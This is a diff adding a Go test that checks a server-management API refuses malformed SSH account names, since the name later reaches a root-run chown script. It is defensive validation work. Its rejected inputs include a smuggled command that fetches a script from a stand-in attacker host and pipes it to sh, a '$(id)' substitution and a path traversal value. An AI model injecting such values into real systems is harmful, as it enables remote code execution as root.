@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"net/http/httptest"
 	"path/filepath"
+	"strings"
 	"testing"
 	"time"
 
@@ -351,6 +352,41 @@ func TestAdminOnlyRoutesRefuseAnOrdinaryAccount(t *testing.T) {
 	} {
 		if status, body := h.do(acme, http.MethodGet, path, nil); status != http.StatusForbidden {
 			t.Errorf("GET %s answered %d for a non-administrator, want 403\n%s", path, status, body)
+		}
+	}
+}
+
+func TestAServerAccountNameIsRefusedIfItIsNotOne(t *testing.T) {
+	// The account names a home directory and is handed to chown in a script
+	// that runs as root on the server being added. Everything in those scripts
+	// is quoted; this is the other half.
+	h := newHarness(t)
+	acme := h.newTenant("acme")
+
+	for _, name := range []string{
+		"root; curl http://evil.test/s | sh",
+		"$(id)",
+		"a b",
+		"../../etc",
+		"UPPER",
+		"0numeric",
+		"reallylongaccountnamethatnosystemwouldeverhaveproduced",
+	} {
+		_, body := h.do(acme, http.MethodPost, "/api/teams/"+acme.team.ID+"/servers",
+			map[string]any{"host": "203.0.113.10", "ssh_user": name, "password": "x"})
+		if !strings.Contains(body, "not a valid account name") {
+			t.Errorf("ssh_user %q was accepted\n%s", name, body)
+		}
+	}
+
+	// The ones a distribution actually produces get past the name check. The
+	// request then fails for want of a cluster, which is the point: it got
+	// further than the name.
+	for _, name := range []string{"root", "ubuntu", "ec2-user", "deploy_1", "a.b"} {
+		_, body := h.do(acme, http.MethodPost, "/api/teams/"+acme.team.ID+"/servers",
+			map[string]any{"host": "203.0.113.10", "ssh_user": name, "password": "x"})
+		if strings.Contains(body, "not a valid account name") {
+			t.Errorf("ssh_user %q was refused as a bad name\n%s", name, body)
 		}
 	}
 }
